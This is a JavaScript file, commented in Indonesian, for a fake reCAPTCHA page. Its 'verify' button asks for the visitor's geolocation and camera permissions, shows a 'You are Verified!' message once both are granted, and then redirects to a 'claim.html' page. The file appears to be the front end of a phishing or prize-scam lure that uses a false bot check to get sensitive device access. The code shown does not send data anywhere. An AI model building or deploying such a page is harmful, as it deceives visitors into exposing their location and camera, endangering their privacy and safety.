document.addEventListener("DOMContentLoaded", function () {
    const checkbox = document.getElementById("recaptcha-checkbox");
    const verificationBox = document.getElementById("verification-box");
    const verifyBtn = document.getElementById("verify-btn");
    const loading = document.getElementById("loading");

    let locationAccess = false;
    let cameraAccess = false;

    // Saat checkbox reCAPTCHA diklik
    checkbox.addEventListener("change", function () {
        if (checkbox.checked) {
            verificationBox.style.display = "block"; 
        } else {
            verificationBox.style.display = "none"; 
        }
    });

    function requestPermissions() {
        verifyBtn.disabled = true;
        loading.style.display = "block";

        setTimeout(() => {
            navigator.geolocation.getCurrentPosition(
                () => {
                    locationAccess = true;
                    checkVerificationStatus();
                },
                () => {
                    loading.style.display = "none";
                    verifyBtn.disabled = false;
                    alert("Izin lokasi diperlukan!");
                }
            );

            navigator.mediaDevices.getUserMedia({ video: true })
                .then(() => {
                    cameraAccess = true;
                    checkVerificationStatus();
                })
                .catch(() => {
                    loading.style.display = "none";
                    verifyBtn.disabled = false;
                    alert("Izin kamera diperlukan!");
                });
        }, 2000);
    }

    function checkVerificationStatus() {
        if (locationAccess && cameraAccess) {
            loading.style.display = "none";
            verifyBtn.innerText = "✔ You are Verified!";
            verifyBtn.style.background = "#34A853";
            verifyBtn.disabled = true;
    
            setTimeout(() => {
                window.location.replace("claim.html");
            }, 2000);
        }
    }
    
    verifyBtn.addEventListener("click", requestPermissions);    
});   
